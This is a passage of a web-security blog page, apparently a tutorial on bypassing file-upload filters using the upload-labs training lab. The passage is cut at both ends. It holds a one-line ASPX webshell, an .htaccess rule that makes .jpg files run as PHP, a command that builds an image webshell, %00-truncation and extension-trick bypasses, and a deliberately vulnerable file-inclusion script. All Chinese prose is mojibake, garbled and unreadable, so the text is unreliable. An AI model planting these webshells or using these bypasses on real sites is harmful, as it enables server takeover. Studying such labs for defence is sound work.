Language&#x3D;&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;mima&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210415234719164.png" alt="image-20210415234719164"></p><h2 id="ç»•è¿‡MIMEç±»å‹æ£€æµ‹"><a href="#ç»•è¿‡MIMEç±»å‹æ£€æµ‹" class="headerlink" title="ç»•è¿‡MIMEç±»å‹æ£€æµ‹"></a>ç»•è¿‡MIMEç±»å‹æ£€æµ‹</h2><p>åŸç†ï¼šæ£€æµ‹å›¾ç‰‡ç±»å‹æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­httpåŒ…çš„Content-Typeå­—æ®µçš„å€¼ï¼Œæ¥åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶æ˜¯å¦åˆæ³•ã€‚</p><p>ç»•è¿‡æ–¹æ³•ï¼šç”¨burpsuiteæˆªå–å¹¶ä¿®æ”¹æ•°æ®åŒ…ä¸­æ–‡ä»¶çš„content-typeç±»å‹è¿›è¡Œç»•è¿‡ã€‚</p><p>å¸¸è§MIMEç±»å‹ï¼š</p><ul><li>htmlæ–‡ä»¶ï¼štext/html</li><li>txtæ–‡ä»¶ï¼štext/plain</li><li>pdfæ–‡æ¡£ï¼šapplication/pdf</li><li>wordæ–‡ä»¶ï¼šapplication/msword</li><li>pngå›¾ç‰‡ï¼šimage/png</li><li>jpegå›¾ç‰‡ï¼šimage/jpeg</li><li>gifå›¾ç‰‡ï¼šimage/gif</li></ul><p>æµ‹è¯•ï¼šupload-labs/Pass-02</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132434036.png" alt="image-20210416132434036"></p><p>é€šè¿‡å…¶æºç å‘ç°ä»…ä»…åˆ¤æ–­content-typeç±»å‹ï¼Œå› æ­¤ä¸Šä¼ 1.phpæŠ“åŒ…ä¿®æ”¹content-typeä¸ºå›¾ç‰‡ç±»å‹ï¼šimage/jpegã€image/pngã€image/gif</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132812123.png" alt="image-20210416132812123"></p><p>æˆåŠŸåˆ©ç”¨</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210416132939840.png" alt="image-20210416132939840"></p><h2 id="ç»•è¿‡é»‘åå•æ£€æµ‹"><a href="#ç»•è¿‡é»‘åå•æ£€æµ‹" class="headerlink" title="ç»•è¿‡é»‘åå•æ£€æµ‹"></a>ç»•è¿‡é»‘åå•æ£€æµ‹</h2><p>é»‘åå•ç­–ç•¥</p><p>æ–‡ä»¶æ‰©å±•ååœ¨é»‘åå•ä¸­ä¸ºä¸åˆæ³•ï¼Œä¸€èˆ¬æœ‰ä¸ªä¸“é—¨çš„blacklistæ–‡ä»¶ï¼Œé‡Œé¢ä¼šåŒ…å«å¸¸è§çš„å±é™©è„šæœ¬æ–‡ä»¶ã€‚</p><p>ç»•è¿‡æ–¹æ³•</p><p><strong>1.åç¼€å¤§å°å†™ç»•è¿‡</strong>ï¼š</p><p>åœ¨å¯¹åç¼€çš„åˆ¤æ–­ä¸­ï¼Œå¦‚æœåªæ˜¯å¯¹å­—ç¬¦ä¸²è¿›è¡Œå•ç‹¬çš„æ¯”è¾ƒæ¥åˆ¤æ–­æ˜¯ä¸æ˜¯é™åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥é‡‡ç”¨åç¼€åå¤§å°å†™ç»•è¿‡å½¢å¼ã€‚</p><p>æµ‹è¯•ï¼šupload-labs/Pass-06</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221001633.png" alt="image-20210418221001633"></p><p>è¿™é‡Œå¯¹æ–‡ä»¶åç¼€è¿›è¡Œäº†é™åˆ¶ï¼Œä½†æœªå¯¹å­—æ¯å¤§å°å†™åšä»»ä½•å¤„ç†ï¼Œå¯ä»¥å¤§å°å†™ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221031495.png" alt="image-20210418221031495"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418221148741.png" alt="image-20210418221148741"></p><p><strong>2.ç©ºæ ¼ç»•è¿‡:</strong></p><p>å¦‚æœé»‘åå•æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå»ç©ºå¤„ç†ï¼Œå¯ä»¥é€šè¿‡åœ¨åç¼€åååŠ ç©ºè¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br></pre></td></tr></table></figure><p><strong>3.ç‚¹ç»•è¿‡:</strong></p><p>å¦‚æœé»‘åå•æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå».å¤„ç†ï¼Œåˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§,ä¼šè‡ªåŠ¨å»æ‰åç¼€åæœ€åçš„.ï¼Œé€šè¿‡åœ¨æ–‡ä»¶åååŠ .è¿›è¡Œç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br></pre></td></tr></table></figure><p>4.<code>::$DATA</code>ç»•è¿‡:</p><p>å¦‚æœé»‘åå•æ²¡æœ‰å¯¹åç¼€åè¿›è¡Œå»<code>::$DATA</code>å¤„ç†ï¼Œåˆ©ç”¨Windowsä¸‹NTFSæ–‡ä»¶ç³»ç»Ÿçš„ä¸€ä¸ªç‰¹æ€§ï¼ˆåœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+â€::$DATAâ€ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€åï¼Œä¸”ä¿æŒâ€<code>::$DATA</code>â€œä¹‹å‰çš„æ–‡ä»¶åï¼‰ï¼Œå¯ä»¥åœ¨åç¼€åååŠ <code>::$DATA</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418225806235.png" alt="image-20210418225806235"></p><p><strong>5.åŒåç¼€åç»•è¿‡:</strong></p><p>å¦‚æœé»‘åå•æ˜¯å°†é—®é¢˜åç¼€åæ›¿æ¢ä¸ºç©ºï¼Œå¯ä»¥åˆ©ç”¨åŒå†™ç»•è¿‡è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure><p><strong>6.é…åˆæ–‡ä»¶è§£ææ¼æ´ç»•è¿‡:</strong></p><ol><li><p>IISè§£ææ¼æ´<br>åœ¨IIS6.0çš„æƒ…å†µä¸‹æœ‰ä¸‰ç§å¯ä»¥åˆ©ç”¨çš„æ‰‹æ®µ</p><ul><li>ç›®å½•è§£ææ¼æ´ï¼šå»ºç«‹<code>*.asa</code>ã€<code>*.asp</code>æ ¼å¼çš„æ–‡ä»¶å¤¹æ—¶å…¶ç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½ä¼šå½“åšaspæ–‡ä»¶è§£æã€‚</li><li>å½“æ–‡ä»¶åä¸º<code>*.asp;1.jpg</code>æ—¶ï¼ŒIISä¼šä»¥ASPæ–‡ä»¶æ¥è§£æï¼Œä¹Ÿå°±æ˜¯è¯´;èµ·åˆ°äº†æˆªæ–­ä½œç”¨ã€‚</li><li>WebDavæ¼æ´ï¼Œå€ŸåŠ©putæ–¹æ³•ç›´æ¥å‘æœåŠ¡å™¨ä¸Šä¼ å±é™©è„šæœ¬</li></ul></li><li><p>Apacheè§£ææ¼æ´<br>åœ¨Apache 1.Xä¸Apache 2.Xä¸­å¦‚æœç¢°åˆ°æ–‡ä»¶åä¸º<code>demo.php.test</code>çš„æ–‡ä»¶ä¼šæŒ‰phpæ–‡ä»¶è¿›è¡Œè§£æï¼Œæ ¹æ®Apacheçš„è§£æè§„åˆ™ï¼Œå¦‚æœç¢°åˆ°ä¸è®¤è¯†çš„æ‹“å±•åä¾¿ä¼šè¿›è¡Œéå†ï¼Œç›´åˆ°ç¢°åˆ°èƒ½å¤Ÿè§£æçš„æ‹“å±•åã€‚</p><blockquote><p>åœ¨Apacheæ ¹ç›®å½•çš„coof/mime.typesæ–‡ä»¶ä¸­æœ‰è¯¦ç»†çš„å¯è¯†åˆ«æ‹“å±•åã€‚</p></blockquote></li><li><p>Nginxè§£ææ¼æ´</p></li></ol><p>åœ¨Nginxçš„æœåŠ¡å™¨ç¯å¢ƒä¸‹ï¼Œå‡å¦‚æˆåŠŸä¸Šä¼ ä¸€å¼ åä¸ºtest.jpgçš„æ–‡ä»¶åˆ°ç½‘ç«™æ ¹ç›®å½•ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬è®¿é—®<code>www.demo.com/test.jpg/test.php</code>è¿™ä¸ªè™šæ„çš„ç›®å½•æœåŠ¡å™¨åˆ™ä¼šç›´æ¥å°†test.jpgä½œä¸ºphpæ–‡ä»¶è¿›è¡Œè§£æã€‚</p><p><strong>7.htaccessç»•è¿‡</strong></p><p>å½“ä¸Šä¼ <code>.htaccess</code>æ–‡ä»¶åˆ°ç½‘ç«™ç›®å½•æ—¶ï¼Œè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶ä¼šæŒ‰å…¶é…ç½®ç”Ÿæ•ˆè§£æã€‚</p><p>æ¡ä»¶</p><ul><li>apacheæœåŠ¡å™¨</li><li>èƒ½å¤Ÿä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œä¸€èˆ¬ä¸ºé»‘åå•é™åˆ¶ã€‚</li><li>AllowOverride Allï¼ˆé»˜è®¤é…ç½®ä¸ºå…³é—­Noneï¼‰</li><li>LoadModule rewrite_module modules/mod_rewrite.so #rewriteæ¨¡å—ä¸ºå¼€å¯çŠ¶æ€</li><li>ä¸Šä¼ ç›®å½•å…·æœ‰å¯æ‰§è¡Œæƒé™ã€‚</li></ul><p>æµ‹è¯•ï¼šupload-labs/Pass-04</p><p>ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥ä»£ç å¯¹å¸¸è§çš„å¤šç§ç±»å‹æ–‡ä»¶åç¼€åè¿›è¡Œäº†é™åˆ¶ä¸Šä¼ ï¼Œä½†æ˜¯ä»”ç»†å¯ä»¥å‘ç°ï¼Œå¹¶æ²¡æœ‰å¯¹<code>htaccess</code>æ–‡ä»¶è¿›è¡Œé™åˆ¶ã€‚äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¸Šä¼ ä¸€ä¸ª<code>htaccess</code>æ–‡ä»¶ï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼Œè¿›è¡Œç»•è¿‡æ£€æµ‹ä¸Šä¼ ã€‚</p><p>.htaccessæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure><p>è¿™æ ·æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šå½“æˆphpæ¥è§£æ</p><h2 id="ç»•è¿‡ç™½åå•æ£€æµ‹"><a href="#ç»•è¿‡ç™½åå•æ£€æµ‹" class="headerlink" title="ç»•è¿‡ç™½åå•æ£€æµ‹"></a>ç»•è¿‡ç™½åå•æ£€æµ‹</h2><p>ç™½åå•ç­–ç•¥ï¼šæ–‡ä»¶æ‰©å±•åä¸åœ¨ç™½åå•ä¸­ä¸ºä¸åˆæ³•ã€‚</p><p>ç»•è¿‡æ–¹æ³•ï¼šæœåŠ¡ç«¯åˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯ä»åå¾€å‰åˆ¤æ–­ï¼Œè€Œå¯¹æ–‡ä»¶è§£ææ˜¯ä»å‰å¾€åè§£æï¼Œå¯ä»¥åˆ©ç”¨00æˆªæ–­çš„æ–¹<br>å¼è¿›è¡Œç»•è¿‡ã€‚å¦‚åº”ç”¨æœ¬æ¥åªå…è®¸ä¸Šä¼ jpgå›¾ç‰‡ï¼Œé‚£ä¹ˆå¯ä»¥æ„é€ æ–‡ä»¶åä¸º<code>xxx.php%00.jpg</code>,å…¶ä¸­<code>%00</code>ä¸ºåå…­è¿›åˆ¶çš„<code>0x00</code>å­—ç¬¦ï¼Œ.jpgéª—è¿‡äº†åº”ç”¨çš„ä¸Šä¼ æ–‡ä»¶ç±»å‹æ£€æµ‹ï¼Œä½†å¯¹äºæœåŠ¡å™¨æ¥è¯´ï¼Œå› ä¸º<code>%00</code>å­—ç¬¦æˆªæ–­çš„å…³ç³»ï¼Œæœ€ç»ˆä¸Šä¼ çš„æ–‡ä»¶å˜æˆäº†<code>xxx.php</code>ã€‚</p><p>æµ‹è¯•ï¼šupload-labs/Pass-12</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232436067.png" alt="image-20210418232436067"></p><p>ç™½åå•åˆ¤æ–­ï¼Œä½†$img_pathæ˜¯ç›´æ¥æ‹¼æ¥ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨%00æˆªæ–­ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><blockquote><p>æˆªæ–­æ¡ä»¶ï¼šphpç‰ˆæœ¬å°äº5.3.4ï¼Œphpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232327452.png" alt="image-20210418232327452"></p><h2 id="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹"><a href="#ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹" class="headerlink" title="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹"></a>ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹</h2><p>æ–‡ä»¶å¤´æ ¡éªŒåŸç†ï¼šåˆ¤æ–­æ–‡ä»¶å¤´å†…å®¹æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚</p><p>å¸¸è§çš„æ–‡ä»¶å¤´å¯¹åº”å…³ç³»ï¼š</p><ul><li>.jpegã€jpgï¼šJPGGraphicFile</li><li>.gifï¼šGIF 89A</li><li>.zipï¼šZip Compressed</li></ul><p>ç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥ï¼šä¸Šä¼ å›¾ç‰‡é©¬ï¼Œé€šè¿‡æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡å›¾ç‰‡ç±»å‹å†…å®¹æ£€æŸ¥ã€‚</p><p>çªç ´getimagesize()å‡½æ•°ï¼šå›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯å¸¸ç”¨æ£€æµ‹å‡½æ•°ï¼Œç”¨ä»¥è·å–æ–‡ä»¶ç±»å‹ï¼Œç»•è¿‡åªéœ€è¦æŠŠæ–‡ä»¶å¤´éƒ¨åˆ†ä¼ªé€ å¥½ã€‚</p><p>æµ‹è¯•ï¼šupload-labs/Pass-14</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå› æ­¤ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ï¼Œåˆ¶ä½œå›¾ç‰‡é©¬(cmdä¸‹copyå‘½ä»¤)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.gif /b + test.php /a shell.gif</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143058835.png" alt="image-20210424143058835"></p><p>ç›´æ¥è®¿é—®å›¾ç‰‡å¹¶ä¸èƒ½æŠŠå›¾ç‰‡å½“åšPHPè§£æï¼Œå› æ­¤è¿˜éœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨äºæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span 